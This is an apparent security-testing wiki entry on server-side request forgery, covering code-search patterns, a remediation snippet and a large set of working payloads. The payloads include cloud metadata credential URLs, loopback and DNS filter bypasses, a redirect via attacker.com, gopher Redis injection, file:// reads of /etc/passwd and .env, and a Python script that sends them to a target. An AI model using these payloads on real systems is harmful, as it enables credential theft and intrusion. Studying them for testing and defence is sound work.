# SSRF — Server-Side Request Forgery

**Tags:** #high #ssrf #cloud #pivot #internal-network
**OWASP:** A10:2021 Server-Side Request Forgery
**CVSS Base:** 8.6 (High — unauthenticated, changed scope)

---

## 📖 What it is

SSRF allows an attacker to induce the server to make HTTP requests to arbitrary destinations — internal or external — using the server as a privileged proxy.

---

## 🔍 `grep_search` Tactics

```
fetch(url
axios.get(url
curl_exec(
file_get_contents($url
HttpClient
WebClient
urllib.request
requests.get(
httpx.get(
http.get(
new URL(
ImageMagick
convert(
```

**Trace:** does the URL come from `req.query`, `req.body`, `req.params`, `$_GET`, `$_POST`?

---

## 🎯 Primary Pivot Targets

### Cloud Metadata Endpoints (critical)
| Cloud | URL | What leaks |
|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` | Temporary IAM credentials |
| AWS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Access Key + Secret |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Service Account tokens |
| Azure | `http://169.254.169.254/metadata/instance` | Managed Identity tokens |

### Internal Network
```
http://localhost/admin
http://127.0.0.1:8080/
http://10.0.0.1/
http://192.168.1.1/
http://172.16.0.1/
```

### Common Internal Services
```
http://localhost:6379/      Redis
http://localhost:5432/      PostgreSQL
http://localhost:27017/     MongoDB
http://localhost:9200/      Elasticsearch
http://localhost:8500/      Consul
http://localhost:2379/      etcd
```

---

## 💣 IP Validation Bypass Techniques

### Alternative Representations of `127.0.0.1`
```
http://0x7f000001/           hexadecimal
http://2130706433/           decimal
http://0177.0.0.1/           octal
http://[::1]/                IPv6 loopback
http://[::ffff:127.0.0.1]/   IPv4-mapped IPv6
http://127.1/                valid short notation
```

### DNS Bypass
```
http://localh0st/            homoglyph
http://127.0.0.1.xip.io/    wildcard DNS service
http://customer.internal.attacker.com/   controlled DNS  internal IP
```

### Redirect Bypass
```
http://attacker.com/redirect?to=http://169.254.169.254/
# Server validates attacker.com but follows the redirect to the blocked IP
```

### DNS Rebinding
```
1. Attacker-controlled domain resolves to external IP (passes validation)
2. After validation, TTL expires and domain starts resolving to internal IP
3. Second request goes to the blocked internal IP
```

---

## 💣 Protocol Smuggling via SSRF

```
# Redis via Gopher (command injection)
gopher://internal-redis:6379/_SET%20key%20hacked%0D%0A

# Memcached via SSRF
dict://internal-memcached:11211/set:key:0:0:5:value

# Local file read
file:///etc/passwd
file:///proc/self/environ
file:///app/.env
```

---

## 🧪 Validation Script

```python
# .tmp/validate_ssrf.py
import requests

TARGET = "http://target.com/api/preview"
PARAM  = "url"

# Internal SSRF candidates
PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0x7f000001/",
    "http://[::1]/",
]

for p in PAYLOADS:
    try:
        r = requests.post(TARGET, json={PARAM: p}, timeout=5)
        if r.status_code == 200 and len(r.text) > 50:
            print(f"[POSSIBLE SSRF] {p}")
            print(f"  Response: {r.text[:200]}")
        else:
            print(f"[blocked/empty] {p} ({r.status_code})")
    except Exception as e:
        print(f"[error] {p}: {e}")
```

---

## 🔗 Chain Exploits

```
SSRF  AWS Metadata  IAM Access Key  Full AWS account compromise
SSRF  Internal Redis  Session key write  Authenticate as admin
SSRF + Open Redirect  Domain whitelist bypass  Critical SSRF
SSRF + XXE  Blind XXE that exfiltrates via HTTP request  SSRF as exfiltration channel
SSRF  Elasticsearch without auth  Full database dump
```

---

## 🛡️ Fix

```python
#  Whitelist of allowed domains
ALLOWED_HOSTS = {"api.trusted.com", "cdn.company.com"}

from urllib.parse import urlparse
import socket, ipaddress

def safe_fetch(url: str) -> str:
    parsed = urlparse(url)
    
    # Check host against whitelist
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Unauthorized host")
    
    # Check if the resolved IP is private (DNS rebinding)
    resolved_ip = socket.gethostbyname(parsed.hostname)
    if ipaddress.ip_address(resolved_ip).is_private:
        raise ValueError("Private IP not allowed")
    
    return requests.get(url, timeout=5, allow_redirects=False).text
```

---

## 📌 References
- [[xml-external-entity-xxe]]
- [[open-redirect]]
- [[iac-security-docker-kubernetes-terraform]]
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)